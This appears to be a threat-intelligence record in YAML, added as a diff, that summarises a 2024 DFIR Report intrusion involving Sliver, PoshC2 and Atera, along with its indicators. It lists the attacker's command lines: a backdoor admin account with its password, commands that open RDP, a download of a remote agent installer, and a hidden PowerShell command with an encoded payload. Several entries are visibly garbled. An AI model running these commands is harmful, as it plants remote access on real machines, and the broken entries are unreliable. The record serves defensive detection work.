@@ -1,0 +1,66 @@
+description: The provided text contains a large amount of obfuscated and fragmented
+  Windows registry and PowerShell commands but does not provide clear, extractable
+  technical indicators or observable behaviors.
+attribution: Unknown threat actor (APT group), Russia
+malware_families:
+- PoshC2
+- Sliver
+- SystemBC
+- AteraAgent
+- WILD_PRIDE
+TTPs:
+  processes: []
+  commandline:
+  - msiexec /i setup.msi /qn
+  - nsiexec /isetup.msi /qn
+  - net user WDAGUtilltyAccount Ujmqaz5055 /add
+  - net localgroup Administrators WDAGUtilltyAccount /add
+  - reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections
+    /t REG_DWORD/d 0 /f
+  - netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP
+    localport=3389action=allow
+  - curl -o setup.msi "https://HelpdeskSupsort613811560.servicedesk.atera.com/GetAgent/Msi/?customerId=1&integratorLogin=datilragna%s40gmail.com&accountId="
+  powershell:
+  - powershell -exec bypass -Noninteractive -windowstyle hidden -eWwBTAHKkAcwBOAGUAbQAUAE4AZQBOAC4AUWBTAHIAdgBpAGMAZQBQAG8AaQBUAHQATQBhAG4AYQBNAGUACcgBdADOAOgBTAGUACGB2AGUAcgBDAGUAcgBOAGKAZgBpAGMAYQBOAGUAVgBhAGwAaQBKAGEAJABpAG8AbgBDAGEAbDABSAGIAYQBjAGSAIAA9ACAAewAKkAHQAcgB1AGUATQA7ACQATQBTADOAWWBTAHKACwWBOAGUAbQAUAFQAZQB4AHQALgBFAG4AYwBVAGQAaQBUAGCAXQAGADOAVQBUAEYAQDAAUAECcAZQBOAFMAdABYAGkAbgBnACgAWWBTAHKAcwBOAGUAbQAUAEMAbwBUAHYAZQBYAHQAXQAG6ADOARgBYAGBAbQBCAGEACWB1ADYANABTAHQAcgBpAG4AZwAoACgAbnVwYWx0aW5lZCBzZXJ2aWNlIGFjY291bnQgZG9jdW1lbnRzIHNldmVyIGFuZCByZWdpc3RlciBjb25uZWN0aXZlIGluZm9ybWF0aW9uIGxpbmVzLiAgICAgICAK
+  scripting_engine: []
+  registry_keys:
+  - HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server
+  - HKEY_CURRENT_USER\\Software\\ATERA Networks
+  - HKEY_LOCAL_MACHINE\\SOFTWARE\\ATERA Networks
+  - HKEY_CLASSES_ROOT\\Installer\\Products\\4758948C95C1B194AB15204D95B42292
+  image_load: []
+  network_connections:
+  - process: setup.msi
+    destination: 185.234.216.64:8000
+  - process: PoshC2
+    destination: 94.198.53.143:8000
+  file_activity:
+  - atera_del.bat
+  - shadow.bat
+  - backup.bat
+  - clearlog.bat
+  - setup_uncnow.msi
+  - Posh_v2_dropper_x64.exe
+  - WILD_PRIDE.exe
+  persistence: []
+  process_relations: []
+IOCs:
+  ip_addresses:
+  - 94.198.53.143
+  - 185.234.216.64
+  domains:
+  - HelpdeskSupsort613811560.servicedesk.atera.com
+  urls: []
+  hashes: []
+  ips:
+  - 94.198.53.143
+  - 185.234.216.64
+  - 4.198.55.181
+  - 198.51.247.94
+authors:
+- r3nzsec
+- 0xtornado
+- 0xThiebaut
+reference: https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts
+date_of_publication: August 12, 2024
+file_creation_date: October 01, 2025
